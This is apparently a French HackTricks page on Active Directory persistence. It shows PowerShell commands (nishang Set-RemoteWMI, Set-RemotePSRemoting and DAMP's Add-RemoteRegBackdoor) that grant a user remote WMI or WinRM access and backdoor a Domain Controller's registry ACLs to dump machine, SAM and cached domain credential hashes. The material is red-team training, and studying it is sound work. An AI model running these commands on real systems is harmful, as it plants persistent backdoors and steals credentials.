# Descripteurs de sécurité

{{#include ../../banners/hacktricks-training.md}}

## Descripteurs de sécurité

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) définit le format utilisé pour décrire un descripteur de sécurité. SDDL utilise des chaînes ACE pour les DACL et les SACL : `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Les **descripteurs de sécurité** sont utilisés pour **stocker** les **permissions** qu’un **objet** possède **sur** un **objet**. Si vous pouvez simplement **effectuer** une **petite modification** dans le **descripteur de sécurité** d’un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d’être membre d’un groupe privilégié.

Ainsi, cette technique de persistence repose sur la capacité à obtenir chaque privilège nécessaire sur certains objets, afin de pouvoir effectuer une tâche qui nécessite généralement des privilèges admin, mais sans avoir besoin d’être admin.

### Accès à WMI

Vous pouvez donner à un utilisateur l’accès pour **exécuter WMI à distance** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> :
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Accès à WinRM

Donner accès à la **console PS winrm à un utilisateur** [**à l'aide de ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accès distant aux hashes

Accédez au **registry** et **dump les hashes** en créant une **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** afin de pouvoir à tout moment récupérer le **hash de l’ordinateur**, le **SAM** et toute **credential AD** mise en cache sur l’ordinateur. Il est donc très utile d’accorder cette permission à un **regular user contre un ordinateur Domain Controller** :<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consultez les [**Silver Tickets**](silver-ticket.md) pour découvrir comment utiliser le hash du compte ordinateur d’un contrôleur de domaine.

## Références

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
